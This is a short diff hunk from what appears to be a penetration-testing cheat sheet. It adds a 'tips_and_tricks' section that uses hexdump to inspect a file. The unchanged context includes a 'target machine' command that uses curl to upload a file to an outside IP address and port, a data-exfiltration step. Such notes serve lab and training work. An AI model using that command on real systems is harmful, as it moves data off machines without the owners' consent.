@@ -385,6 +385,12 @@ target machine:
 curl 192.168.43.15:8000 --upload-file [file_name]
 ```
 
+tips_and_tricks:
+```
+to extract data from a hex file
+
+hexdump -C [file_name]
+```
 
 
 
